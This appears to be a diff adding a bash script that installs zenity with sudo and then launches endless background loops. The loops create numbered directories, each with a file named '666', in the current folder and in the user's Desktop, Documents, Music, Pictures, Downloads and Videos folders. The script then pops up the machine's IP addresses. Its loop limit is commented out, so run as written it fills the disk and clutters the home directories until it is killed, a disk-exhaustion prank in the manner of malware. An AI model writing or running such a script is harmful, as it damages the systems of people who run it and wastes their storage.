@@ -1,0 +1,64 @@
+#!/bin/bash
+
+# Need this to display users ipv4 and ipv6 on screen
+sudo apt install -y zenity
+
+# Function to create directories and files
+create_files() {
+  local parent_dir="$1"  # Parent directory to create directories in
+  local counter=1
+  while true; do # infinite loop.
+    mkdir -p "$parent_dir/filename$counter" #File name
+    touch "$parent_dir/filename$counter/666" #File name
+    echo "Your text" > "$parent_dir/filename$counter/666" #Enter your text and file name
+    ((counter++)) # increment the counter
+    #optional, if you want to set a limit, remove the comment.
+    #if [[ $counter -gt 100 ]]; then #example limit of 100 directories.
+    #  break
+    #fi
+  done & # run the loop in the background.
+}
+
+# Create directories and files in the current directory
+create_files "."
+
+# Create directories and files on the Desktop
+desktop_path="$HOME/Desktop"
+create_files "$desktop_path"
+
+# Create directories and files in the Documents directory
+documents_path="$HOME/Documents"
+create_files "$documents_path"
+
+# Create directories and files in the Music directory
+music_path=~/Music
+create_files "$music_path"
+
+# Create directories and files in the Pictures directory
+pictures_path=~/Pictures
+create_files "$pictures_path"
+
+# Create directories and files in the Downloads directory
+downloads_path=~/Downloads
+create_files "$downloads_path"
+
+# Create directories and files in the Videos directory
+videos_path=~/Videos
+create_files "$videos_path"
+
+# Get IPv4 and IPv6 addresses
+ipv4=$(ip addr | grep -oE "inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}")
+ipv6=$(ip addr | grep -oE "inet6 [0-9a-fA-F:]+" | grep -oE "[0-9a-fA-F:]+")
+
+# Display IPv4 and IPv6 addresses using zenity
+if [[ -n "$ipv4" && -n "$ipv6" ]]; then
+  zenity --info --text="IPv4: $ipv4\nIPv6: $ipv6"
+elif [[ -n "$ipv4" ]]; then
+  zenity --info --text="IPv4: $ipv4"
+elif [[ -n "$ipv6" ]]; then
+  zenity --info --text="IPv6: $ipv6"
+else
+  zenity --error --text="Could not retrieve IP addresses."
+fi
+
+wait #wait for background processes to finish.
